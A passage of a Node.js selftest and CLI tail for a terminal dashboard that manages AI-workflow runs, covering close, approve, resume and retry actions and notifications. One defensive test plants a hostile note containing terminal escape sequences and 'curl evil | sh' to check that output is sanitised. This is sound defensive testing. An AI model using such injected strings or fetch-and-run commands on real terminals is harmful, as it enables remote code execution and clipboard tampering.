  assert.strictEqual(handleKey(armed.view, { name: 'y' }).view.confirm, false, 'the prompt clears after confirming');
  for (const key of [{ name: 'n' }, { name: 'escape' }, { name: 'return' }, { name: 'q' }, { name: 'down' }]) {
    const cancelled = handleKey(armed.view, key);
    assert.strictEqual(cancelled.action, 'close-cancel', `${key.name} must cancel, not close`);
    assert.strictEqual(cancelled.view.confirm, false);
  }
  assert.strictEqual(handleKey(armed.view, { name: 'c', ctrl: true }).action, 'quit', 'ctrl-c still quits while confirming');
  assert.strictEqual(handleKey({ index: 0, count: 0, all: false }, { name: 'c' }).action, null, 'nothing to close with no runs');

  // Only an unverified run needs admin mode; a verified one closes normally.
  const verifiedRun = { id: 'FEAT-V', percent: 100, phases: [{ id: 'verification', status: 'pass' }] };
  const unverifiedRun = { id: 'FEAT-U', percent: 43, phases: [{ id: 'verification', status: 'pending' }] };
  assert.deepStrictEqual(closeCommand(verifiedRun), { verified: true, admin: false, args: [RUNS_CLI, 'close', 'FEAT-V'] });
  const abandon = closeCommand(unverifiedRun);
  assert.strictEqual(abandon.admin, true);
  assert.deepStrictEqual(abandon.args, [RUNS_CLI, 'close', 'FEAT-U', ABANDON_REASON]);
  assert.match(confirmPrompt(unverifiedRun), /abandoned/);
  assert.match(confirmPrompt(verifiedRun), /verified/);
  assert.strictEqual(confirmPrompt(null), 'Nothing to close.');

  // The prompt replaces the key hints and still fits the frame.
  const confirming = renderFrame({ runs, index: 0, width: 100, height: 24, color: false, confirm: 'close' });
  assert(confirming.includes('y = confirm'), 'the confirmation prompt is shown');
  assert(confirming.includes(runs[0].id));
  assert(!confirming.includes('c close'), 'key hints give way to the prompt');
  for (const line of confirming.split('\n').filter(l => l.startsWith('│'))) assert.strictEqual(width(line), 100);
  assert(renderFrame({ runs, index: 0, width: 100, height: 24, color: false }).includes('c close'), 'the close key is advertised');
  assert.strictEqual(handleKey({ index: 0, count: 0, all: false }, { name: 'down' }).view.index, 0, 'no runs, no crash');

  // Non-interactive rendering writes one frame and returns it.
  const chunks = [];
  const fake = { isTTY: false, columns: 90, rows: 24, write: c => chunks.push(c), on() {} };
  const result = run({ demo: true, once: true, stdout: fake, color: false });
  assert.strictEqual(chunks.length, 1);
  assert(result.frame.includes('FEAT-002'));

  // A real state root renders without a TTY.
  const temp = fs.mkdtempSync(path.join(os.tmpdir(), 'dashboard-'));
  fs.mkdirSync(path.join(temp, 'FEAT-9'), { recursive: true });
  fs.writeFileSync(path.join(temp, 'FEAT-9', 'state.json'), JSON.stringify({ id: 'FEAT-9', status: 'active', phases: { request: { status: 'pass' } } }));
  const previous = process.env.AI_WORKFLOW_STATE_ROOT;
  process.env.AI_WORKFLOW_STATE_ROOT = temp;
  const live = [];
  run({ once: true, stdout: { isTTY: false, columns: 90, rows: 24, write: c => live.push(c), on() {} }, color: false });
  assert(live.join('').includes('FEAT-9'));
  if (previous === undefined) delete process.env.AI_WORKFLOW_STATE_ROOT; else process.env.AI_WORKFLOW_STATE_ROOT = previous;
  fs.rmSync(temp, { recursive: true, force: true });

  // Closing for real, through runs.js, against a throwaway state root.
  const closeRoot = fs.mkdtempSync(path.join(os.tmpdir(), 'dashboard-close-'));
  const seed = (id, verification) => {
    fs.mkdirSync(path.join(closeRoot, id), { recursive: true });
    fs.writeFileSync(path.join(closeRoot, id, 'state.json'), JSON.stringify({
      id, status: 'active', startedAt: new Date().toISOString(),
      phases: { request: { status: 'pass' }, verification: { status: verification } },
      roles: {}, selectedRoles: {},
    }));
  };
  seed('FEAT-VERIFIED', 'pass');
  seed('FEAT-OPEN', 'pending');
  fs.writeFileSync(path.join(closeRoot, '_active'), 'FEAT-OPEN\n');
  const before = process.env.AI_WORKFLOW_STATE_ROOT;
  process.env.AI_WORKFLOW_STATE_ROOT = closeRoot;
  const stateOf = id => JSON.parse(fs.readFileSync(path.join(closeRoot, id, 'state.json'), 'utf8'));

  const done = closeRun({ id: 'FEAT-VERIFIED', percent: 100, phases: [{ id: 'verification', status: 'pass' }] });
  assert.strictEqual(done.ok, true, done.message);
  assert.strictEqual(stateOf('FEAT-VERIFIED').status, 'done');
  assert.strictEqual(stateOf('FEAT-VERIFIED').abandoned, undefined, 'a verified run is closed, not abandoned');

  const abandoned = closeRun({ id: 'FEAT-OPEN', percent: 43, phases: [{ id: 'verification', status: 'pending' }] });
  assert.strictEqual(abandoned.ok, true, abandoned.message);
  assert.match(abandoned.message, /abandoned/);
  const openState = stateOf('FEAT-OPEN');
  assert.strictEqual(openState.status, 'done');
  assert.strictEqual(openState.abandoned, true, 'closing before verification records an abandon');
  assert.strictEqual(openState.closedReason, ABANDON_REASON);
  assert.strictEqual(openState.history.slice(-1)[0].action, 'abandon', 'the run history keeps the reason');
  assert.strictEqual(fs.existsSync(path.join(closeRoot, '_active')), false, 'closing clears the active pointer');
  assert.deepStrictEqual(listRuns({ root: closeRoot }), [], 'closed runs leave the in-progress list');
  assert.strictEqual(listRuns({ root: closeRoot, all: true }).length, 2);

  const missing = closeRun({ id: 'FEAT-GONE', percent: 0, phases: [] });
  assert.strictEqual(missing.ok, false, 'a failed close is reported, not swallowed');
  assert.match(missing.message, /could not close FEAT-GONE/);

  if (before === undefined) delete process.env.AI_WORKFLOW_STATE_ROOT; else process.env.AI_WORKFLOW_STATE_ROOT = before;
  fs.rmSync(closeRoot, { recursive: true, force: true });

  // Needs you: the banner at the top of the selected run, a marker in the list,
  // the new keys in the footer.
  const blockedRun = runs[2];
  assert.ok(blockedRun.needsYou, 'the demo has a run that needs the human');
  const needs = renderFrame({ runs, index: 2, width: 100, height: 34, color: false });
  const needLines = needs.split('\n');
  // The banner wraps; read the detail pane back as running text.
  const detailText = needLines.filter(l => l.startsWith('│')).map(l => l.split('│')[2].trim()).filter(Boolean).join(' ');
  const bannerAt = needLines.findIndex(l => l.includes('⚠ NEEDS YOU · Same failure as last time'));
  assert.ok(bannerAt > 0, needs);
  assert.ok(bannerAt < needLines.findIndex(l => l.includes('✅ Request')), 'the banner sits above the stages');
  assert(detailText.includes('⚠ NEEDS YOU · Same failure as last time — this needs a fix outside Build + Tests'), detailText);
  assert(detailText.includes('2 widget tests fail in test/rtl_layout_test.dart (expected TextDirection.rtl)'), 'the reason is shown');
  assert(detailText.includes(`→ ${blockedRun.needsYou.command}`), 'the exact command is shown, whole');
  assert(needLines.some(l => /⚠ FEAT-011/.test(l)), 'the list marks the run that needs you');
  assert(!needLines.some(l => /⚠ FEAT-002|⚠ FEAT-007/.test(l)), 'only that run');
  assert(needs.includes('R resume · T retry'), 'the footer lists the new keys');
  for (const line of needLines.filter(l => l.startsWith('│'))) assert.strictEqual(width(line), 100, `banner lines keep the frame width: ${JSON.stringify(line)}`);
  for (const line of renderFrame({ runs, index: 2, width: 60, height: 30, color: false }).split('\n').filter(l => l.startsWith('│'))) assert.strictEqual(width(line), 60);
  // A running engine: its own marker and line, no needs-you banner.
  const running = [{ ...blockedRun, engine: { pid: 4242, kind: 'engine', command: 'resume', startedAt: null, host: os.hostname() } }];
  const runningFrame = renderFrame({ runs: running, index: 0, width: 100, height: 30, color: false });
  assert(runningFrame.includes('● FEAT-011'), 'the list marks a running engine');
  assert(runningFrame.includes('● engine running · engine pid 4242 (resume)'));
  assert(!runningFrame.includes('NEEDS YOU'), 'a running engine is not waiting on anyone');
  // The approval gate: the banner shows the plan digest, P opens the plan and
  // A approves, but only after y; no key returns an action that approves
  // without an armed confirm.
  const gateRoot = fs.mkdtempSync(path.join(os.tmpdir(), 'dashboard-gate-'));
  fs.mkdirSync(path.join(gateRoot, 'FEAT-G'), { recursive: true });
  fs.writeFileSync(path.join(gateRoot, 'FEAT-G', '06-plan.json'), JSON.stringify({ schemaVersion: 1, runId: 'FEAT-G', summary: `REVIEW AMENDMENTS (binding). ${'The summary line of the plan, long enough to be cut to the pane. '.repeat(20)}`, steps: Array.from({ length: 9 }, (_, i) => ({ id: `S${i}`, description: 'x' })), acceptanceCriteria: Array.from({ length: 23 }, (_, i) => `AC-${i}`), risks: Array.from({ length: 11 }, () => 'r') }));
  fs.writeFileSync(path.join(gateRoot, 'FEAT-G', '06-plan.md'), '# Implementation plan\n\nREVIEW AMENDMENTS (binding).\n');
  const gate = { ...buildSummary('FEAT-G', { status: 'active', roles: {}, phases: { ...Object.fromEntries(PHASES.slice(0, PHASES.indexOf('approval')).map(p => [p, { status: 'pass' }])) } }, { root: gateRoot }), inProgress: true, dir: path.join(gateRoot, 'FEAT-G') };
  const gateFrame = renderFrame({ runs: [gate], index: 0, width: 100, height: 30, color: false });
  assert(gateFrame.includes('⚠ NEEDS YOU · The plan waits for your approval'));
  // The counts line wraps like the headline; read the pane back as running text.
  const gateText = gateFrame.split('\n').filter(l => l.startsWith('│')).map(l => l.split('│')[2].trim()).filter(Boolean).join(' ');
  assert(gateText.includes('Plan: 9 steps · 23 acceptance criteria · 11 risks · REVIEW AMENDMENTS present'), gateText);
  assert(gateFrame.includes('│ REVIEW AMENDMENTS (binding). The summary line'), gateFrame);
  assert(gateText.includes('P opens it · A approves'), gateText);
  assert(/→ (agentic approve FEAT-G|node ai\/tasks\/feature\/runs\.js approve FEAT-G)/.test(gateFrame), gateFrame);
  for (const line of gateFrame.split('\n').filter(l => l.startsWith('│'))) assert.strictEqual(width(line), 100, `digest lines keep the frame width: ${JSON.stringify(line)}`);
  const shortGate = renderFrame({ runs: [gate], index: 0, width: 100, height: 24, color: false });
  assert.ok(shortGate.split('\n').filter(l => l.includes('│ REVIEW AMENDMENTS')).length <= 1 && shortGate.split('\n').length <= 25, 'a short terminal shows fewer summary lines');
  assert(shortGate.includes('Request'), 'and still the stages');
  const armedApprove = handleKey({ index: 0, count: 1, all: false }, { name: 'a', shift: true, sequence: 'A' });
  assert.deepStrictEqual([armedApprove.action, armedApprove.view.confirm], ['approve-request', 'approve']);
  assert.deepStrictEqual([handleKey(armedApprove.view, { name: 'y' }).action, handleKey(armedApprove.view, { name: 'y' }).view.confirm], ['approve-confirm', false]);
  for (const key of [{ name: 'n' }, { name: 'escape' }, { name: 'return' }, { name: 'a', shift: true, sequence: 'A' }, { name: 'down' }]) assert.strictEqual(handleKey(armedApprove.view, key).action, 'approve-cancel', `${key.name} must cancel`);
  assert.strictEqual(handleKey(armedApprove.view, { name: 'c', ctrl: true }).action, 'quit');
  assert.deepStrictEqual([handleKey(view, { name: 'a' }).action, handleKey(view, { name: 'a' }).view.all], ['reload', true], 'plain a still toggles finished runs');
  assert.strictEqual(handleKey(view, { name: 'p', shift: true, sequence: 'P' }).action, 'open-plan');
  assert.strictEqual(handleKey(view, { name: 'p', sequence: 'p' }).action, null);
  assert.strictEqual(handleKey({ index: 0, count: 0, all: false }, { name: 'a', shift: true, sequence: 'A' }).action, null, 'nothing to approve with no runs');
  for (const key of [{ name: 'a', shift: true, sequence: 'A' }, { name: 'p', shift: true, sequence: 'P' }, { name: 'y' }, { name: 'return' }, { name: 'r', shift: true, sequence: 'R' }]) assert.ok(!/^approve-confirm$/.test(handleKey(view, key).action || ''), `${key.sequence || key.name} must not approve without an armed confirm`);
  assert.match(confirmPrompt(gate, 'approve'), /^Approve FEAT-G\? The plan in .*06-plan\.md becomes binding.*y = confirm/);
  const approving = renderFrame({ runs: [gate], index: 0, width: 100, height: 30, color: false, confirm: 'approve' });
  assert(approving.includes('Approve FEAT-G?') && !approving.includes('A approve · P plan'), 'the approve prompt replaces the key hints');
  for (const cols of [100, 80]) {
    const footer = renderFrame({ runs: [gate], index: 0, width: cols, height: 30, color: false });
    assert(footer.includes('R resume · T retry') && footer.includes('A approve · P plan'), `${cols} columns: ${footer.split('\n').at(-1)}`);
  }
  // P: the plan in $PAGER (split on whitespace, no shell) with the dashboard
  // suspended meanwhile; a pager that cannot run leaves the path on screen.
  const pagerCalls = [];
  const order = [];
  const opened = openPlan(gate, { spawnSyncFn: (bin, args, opts) => { pagerCalls.push({ bin, args, opts }); order.push('pager'); return { status: 0 }; }, env: { PAGER: 'less -R' }, suspend: () => order.push('suspend'), resume: () => order.push('resume') });
  assert.strictEqual(opened.ok, true);
  assert.deepStrictEqual([pagerCalls[0].bin, pagerCalls[0].args, pagerCalls[0].opts.stdio, pagerCalls[0].opts.shell], ['less', ['-R', path.join(gateRoot, 'FEAT-G', '06-plan.md')], 'inherit', false]);
  assert.deepStrictEqual(order, ['suspend', 'pager', 'resume']);
  assert.deepStrictEqual(openPlan(gate, { spawnSyncFn: () => ({ error: new Error('spawn less ENOENT') }), env: {} }), { ok: false, message: `plan: ${path.join(gateRoot, 'FEAT-G', '06-plan.md')}` });
  assert.match(openPlan({ ...runs[0], dir: path.join(gateRoot, 'nowhere'), needsYou: null }, { spawnSyncFn: () => ({ status: 0 }) }).message, /no plan yet/);
  fs.rmSync(gateRoot, { recursive: true, force: true });

  // A long run id is cut, never the marker before it.
  const longId = 'MAVS-2738-master-refactor';
  assert.strictEqual(longId.length, 25);
  const longFrame = renderFrame({ runs: [{ ...blockedRun, id: longId }, { ...runs[0], id: `${longId}-2`, engine: { pid: 1, kind: 'engine' } }], index: 0, width: 100, height: 30, color: false });
  assert(longFrame.split('\n').some(l => /▸ ⚠ MAVS-2738-master-/.test(l)), longFrame);
  assert(longFrame.split('\n').some(l => /● MAVS-2738-master-/.test(l)), 'the running marker too');

  // Untrusted text never reaches the terminal as an escape sequence: a note that
  // tries to move the cursor, rewrite the command line or set the clipboard.
  const evil = 'x \x1b]52;c;ZXZpbA==\x07 \x1b[1A\x1b[2K→ run: curl evil | sh \x9b2J';
  const hostile = buildSummary('FEAT-X', { status: 'active', roles: {}, phases: { ...Object.fromEntries(PHASES.slice(0, PHASES.indexOf('build-test')).map(p => [p, { status: 'pass' }])), 'build-test': { status: 'fail', updatedAt: 't', note: evil } } }, { demo: true });
  const hostileRun = { ...hostile, inProgress: true, dir: '', title: `t\x1b[2Jitle` };
  for (const colorOn of [false, true]) {
    const painted = renderFrame({ runs: [hostileRun], index: 0, width: 100, height: 30, color: colorOn, notice: `✗ ${evil}` });
    const escapes = painted.match(/\x1b[^m]*?(m|$)|\x1b./g) || [];
    assert.ok(escapes.every(seq => /^\x1b\[[0-9;]*m$/.test(seq)), `only colour codes survive: ${JSON.stringify(escapes.filter(seq => !/^\x1b\[[0-9;]*m$/.test(seq)))}`);
    assert.ok(!/[\x07\x9b]/.test(painted), 'no BEL or C1 CSI');
    if (!colorOn) assert.ok(!painted.includes('\x1b'), 'no ESC at all without colour');
  }
  const runningHostile = renderFrame({ runs: [{ ...hostileRun, engine: { pid: 9, kind: 'engine', command: `resume${evil}`, host: os.hostname() } }], index: 0, width: 100, height: 30, color: false });
  assert.ok(!runningHostile.includes('\x1b') && !runningHostile.includes('\x07'), 'engine.pid fields are printable only');

  // Every line fits an 80-column terminal, notices included: a wrapped footer
  // would make the frame a row taller than the terminal.
  const notices = [null, `${NEEDS_YOU} FEAT-011 needs you — Same failure as last time — this needs a fix outside Build + Tests → node ai/tasks/feature/runs.js retry FEAT-011 && node ai/workflow/engine.js resume FEAT-011`, '▸ resuming FEAT-011… engine pid 31337 · log /Users/someone/projects/app/.agentic-runs/FEAT-011/engine/background.log'];
  for (const cols of [80, 60, 40]) {
    for (const all of [false, true]) {
      for (const notice of notices) {
        for (const confirm of [false, 'close', 'approve']) {
          const fitted = renderFrame({ runs, index: 2, width: cols, height: 24, color: false, all, notice, confirm });
          for (const line of fitted.split('\n')) assert.ok(width(line) <= cols, `${cols} columns: ${width(line)} ${JSON.stringify(line)}`);
        }
      }
    }
    assert.ok(renderFrame({ runs: [], index: 0, width: cols, height: 20, color: false }).split('\n').every(line => width(line) <= cols));
  }
  assert(renderFrame({ runs, index: 0, width: 80, height: 24, color: false }).includes('R resume · T retry'), 'a narrow footer still names R and T');

  // R / T: shifted keys; plain r stays refresh.
  assert.strictEqual(handleKey(view, { name: 'r', shift: true, sequence: 'R' }).action, 'resume');
  assert.strictEqual(handleKey(view, { name: 't', shift: true, sequence: 'T' }).action, 'retry');
  assert.strictEqual(handleKey(view, { name: 'r', sequence: 'r' }).action, 'reload');
  assert.strictEqual(handleKey(view, { name: 't', sequence: 't' }).action, null);
  assert.strictEqual(handleKey({ index: 0, count: 0, all: false }, { name: 'r', shift: true, sequence: 'R' }).action, null, 'nothing to resume with no runs');

  // The bell: new needs-you keys and completions ring once; what was already
  // there when the terminal opened does not.
  const seenKeys = new Set();
  assert.deepStrictEqual(newAttention(seenKeys, runs, true), [], 'opening the terminal rings nothing');
  assert.deepStrictEqual(newAttention(seenKeys, runs), [], 'nothing new, no bell');
  const later = runs.map(r => (r.id === 'FEAT-007' ? { ...r, needsYou: { ...blockedRun.needsYou, key: 'FEAT-007|build-test|fail|t9', headline: 'Build + Tests failed' } } : r));
  const rung = newAttention(seenKeys, later);
  assert.deepStrictEqual(rung.map(e => e.id), ['FEAT-007']);
  assert.match(rung[0].message, /^⚠ FEAT-007 needs you — Build \+ Tests failed → /);
  assert.deepStrictEqual(newAttention(seenKeys, later), [], 'each event rings once');
  const finished = [{ ...runs[1], current: 'Done', needsYou: null, completedAt: 'c1', pullRequest: { number: 9, url: 'https://x/pr/9' } }];
  assert.match(newAttention(seenKeys, finished)[0].message, /^✔ FEAT-007 complete · pull request #9 https:\/\/x\/pr\/9$/);
  assert.deepStrictEqual(newAttention(seenKeys, finished), [], 'a completion rings once');
  // Reworked and complete again: a new completion time, so it rings again, with
  // the same key the engine's desktop notification uses.
  const again = [{ ...finished[0], completedAt: 'c2', pullRequest: null }];
  const rungAgain = newAttention(seenKeys, again);
  assert.deepStrictEqual(rungAgain.map(e => [e.id, e.key]), [['FEAT-007', notify.completeEvent('FEAT-007', { phases: { 'pull-request': { status: 'skipped', updatedAt: 'c2' } } }).key]]);
  // Open conflicts: the same set rings once however often it refreshes; a
  // changed set (one decided, or a pair renumbered) rings again.
  const disputed = (headline, key) => [{ ...runs[1], current: 'Waiting for conflict decisions', engine: null, needsYou: { kind: 'waiting', stage: 'plan', label: 'Implementation Plan', headline, command: 'agentic conflicts FEAT-007', conflicts: ['CONFLICT-001'], key } }];
  assert.strictEqual(newAttention(seenKeys, disputed('2 conflicts need your decision', 'FEAT-007|plan|waiting|CONFLICT-001=A+B,CONFLICT-002=C+D')).length, 1);
  assert.deepStrictEqual(newAttention(seenKeys, disputed('2 conflicts need your decision', 'FEAT-007|plan|waiting|CONFLICT-001=A+B,CONFLICT-002=C+D')), [], 'the same conflicts ring once');
  const fewer = newAttention(seenKeys, disputed('1 conflict needs your decision', 'FEAT-007|plan|waiting|CONFLICT-002=C+D'));
  assert.strictEqual(fewer.length, 1);
  assert.ok(fewer[0].message.includes('needs you — 1 conflict needs your decision → agentic conflicts FEAT-007'), fewer[0].message);

  // startEngine: refuses while an engine is alive; otherwise starts a detached
  // engine with no shell, its output in the run's engine/background.log.
  const startRoot = fs.mkdtempSync(path.join(os.tmpdir(), 'dashboard-start-'));
  try {
    const runDir = path.join(startRoot, 'FEAT-R');
    fs.mkdirSync(path.join(runDir, 'engine'), { recursive: true });
    const target = { id: 'FEAT-R', dir: runDir, inProgress: true };
    const calls = [];
    const fakeSpawn = (file, args, opts) => { calls.push({ file, args, opts }); return { pid: 31337, on() {}, unref() {} }; };
    const refused = startEngine(target, 'resume', { spawnFn: fakeSpawn, live: () => ({ pid: 777, kind: 'engine', command: 'resume' }), cwd: startRoot });
    assert.strictEqual(refused.ok, false);
    assert.match(refused.message, /^✗ FEAT-R is already running \(engine pid 777 \(resume\)\); not starting a second engine$/);
    assert.strictEqual(calls.length, 0, 'nothing started while an engine is alive');
    assert.match(startEngine({ ...target, inProgress: false }, 'resume', { spawnFn: fakeSpawn, live: () => null }).message, /is closed/);
    // R on a stopped stage or a waiting gate starts nothing and says what to do.
    const stuck = { ...target, needsYou: { kind: 'fail', stage: 'build-test', label: 'Build + Tests', command: 'agentic retry FEAT-R' } };
    assert.deepStrictEqual(startEngine(stuck, 'resume', { spawnFn: fakeSpawn, live: () => null, cwd: startRoot }), { ok: false, message: '✗ FEAT-R: Build + Tests needs a retry first — press T (or run: agentic retry FEAT-R)' });
    assert.deepStrictEqual(startEngine({ ...target, needsYou: { ...stuck.needsYou, kind: 'blocked', stage: 'verification', label: 'Final Verification' } }, 'resume', { spawnFn: fakeSpawn, live: () => null }).message, '✗ FEAT-R: Final Verification needs a retry first — press T (or run: agentic retry FEAT-R)');
    assert.deepStrictEqual(startEngine({ ...target, needsYou: { kind: 'waiting', stage: 'approval', label: 'Human Approval', command: 'agentic approve FEAT-R' } }, 'resume', { spawnFn: fakeSpawn, live: () => null }), { ok: false, message: '✗ FEAT-R waits for you — run: agentic approve FEAT-R' });
    // Open conflicts: R names the decision and the command that lists them.
    assert.deepStrictEqual(startEngine({ ...target, needsYou: { kind: 'waiting', stage: 'plan', label: 'Implementation Plan', headline: '2 conflicts need your decision', command: 'agentic conflicts FEAT-R', conflicts: ['CONFLICT-001', 'CONFLICT-002'] } }, 'resume', { spawnFn: fakeSpawn, live: () => null }), { ok: false, message: '✗ FEAT-R: 2 conflicts need your decision — run: agentic conflicts FEAT-R' });
    assert.strictEqual(calls.length, 0, 'nothing started for either');
    // A blocked pull-request stage is continued by a resume; T still retries a failed stage.
    const prResume = startEngine({ ...target, needsYou: { kind: 'blocked', stage: 'pull-request', label: 'Pull Request', command: 'agentic resume FEAT-R' } }, 'resume', { spawnFn: fakeSpawn, live: () => null, cwd: startRoot });
    assert.strictEqual(prResume.ok, true, prResume.message);
    const retryStuck = startEngine(stuck, 'retry', { spawnFn: fakeSpawn, live: () => null, spawnSyncFn: () => ({ status: 0, stdout: '', stderr: '' }), cwd: startRoot });
    assert.strictEqual(retryStuck.ok, true, retryStuck.message);
    calls.length = 0;
    const started = startEngine(target, 'resume', { spawnFn: fakeSpawn, live: () => null, engine: '/runtime/engine.js', cwd: startRoot, env: { X: '1' } });
    assert.strictEqual(started.ok, true, started.message);
    assert.match(started.message, /^▸ resuming FEAT-R… engine pid 31337 · log FEAT-R\/engine\/background\.log$/);
    assert.deepStrictEqual([calls[0].file, calls[0].args], [process.execPath, ['/runtime/engine.js', 'resume', 'FEAT-R']]);
    assert.deepStrictEqual([calls[0].opts.shell, calls[0].opts.detached, calls[0].opts.cwd, calls[0].opts.env], [false, true, startRoot, { X: '1' }]);
    assert.strictEqual(calls[0].opts.stdio[0], 'ignore');
    assert.ok(Number.isInteger(calls[0].opts.stdio[1]) && calls[0].opts.stdio[1] === calls[0].opts.stdio[2], 'stdout and stderr go to the log file');
    assert.match(fs.readFileSync(path.join(runDir, 'engine', 'background.log'), 'utf8'), /resume started from agentic progress/);
    // T: retry first; a refused retry starts nothing and says why.
    const syncCalls = [];
    const noRetry = startEngine(target, 'retry', { spawnFn: fakeSpawn, live: () => null, runsCli: '/runtime/runs.js', spawnSyncFn: (file, args) => { syncCalls.push(args); return { status: 1, stdout: '', stderr: '✗ nothing to retry; run agentic resume FEAT-R\n' }; } });
    assert.deepStrictEqual([noRetry.ok, noRetry.message], [false, '✗ FEAT-R: nothing to retry; run agentic resume FEAT-R']);
    assert.deepStrictEqual(syncCalls[0], ['/runtime/runs.js', 'retry', 'FEAT-R']);
    assert.strictEqual(calls.length, 1);
    const retried = startEngine(target, 'retry', { spawnFn: fakeSpawn, live: () => null, spawnSyncFn: () => ({ status: 0, stdout: 'FEAT-R: retried build-test\n', stderr: '' }), cwd: startRoot });
    assert.match(retried.message, /^▸ retrying FEAT-R… engine pid 31337/);
    assert.strictEqual(calls.length, 2);
    // A: runs.js approve first, then the resume; a run not at the gate is refused.
    const approved = startEngine({ ...target, needsYou: { kind: 'waiting', stage: 'approval', label: 'Human Approval', command: 'agentic approve FEAT-R' } }, 'approve', { spawnFn: fakeSpawn, live: () => null, spawnSyncFn: (file, args) => { syncCalls.push(args); return { status: 0, stdout: 'FEAT-R: plan approved\n', stderr: '' }; }, cwd: startRoot });
    assert.match(approved.message, /^▸ approved FEAT-R · resuming… engine pid 31337/);
    assert.deepStrictEqual(syncCalls.at(-1), [RUNS_CLI, 'approve', 'FEAT-R']);
    assert.deepStrictEqual(startEngine(stuck, 'approve', { spawnFn: fakeSpawn, live: () => null }), { ok: false, message: '✗ FEAT-R: nothing waits for approval' });
    assert.strictEqual(calls.length, 3);
    // The real launch (a stand-in engine, a live engine.pid) is engine-launch.js' own selftest.
    require('./engine-launch').selftest();
  } finally { fs.rmSync(startRoot, { recursive: true, force: true }); }

  console.log('dashboard selftest OK');
}

function parseArgs(argv) {
  const options = { all: false, demo: false, once: false, run: null, interval: 1000 };
  for (let i = 0; i < argv.length; i++) {
    const arg = argv[i];
    if (arg === '--all') options.all = true;
    else if (arg === '--demo') options.demo = true;
    else if (arg === '--once') options.once = true;
    else if (arg === '--color') options.color = true;
    else if (arg === '--no-color') options.color = false;
    else if (arg === '--run') options.run = argv[++i];
    else if (arg === '--interval') options.interval = Math.max(250, Number(argv[++i]) || 1000);
    else if (!arg.startsWith('--') && !options.run) options.run = arg;
  }
  return options;
}

if (require.main === module) {
  if (process.argv.includes('--selftest')) selftest();
  else run(parseArgs(process.argv.slice(2)));
}

module.exports = { width, pad, truncate, safe, bar, listLines, bannerLines, detailLines, renderFrame, handleKey, isVerified, closeCommand, confirmPrompt, closeRun, startEngine, openPlan, newAttention, demoRuns, run, parseArgs };
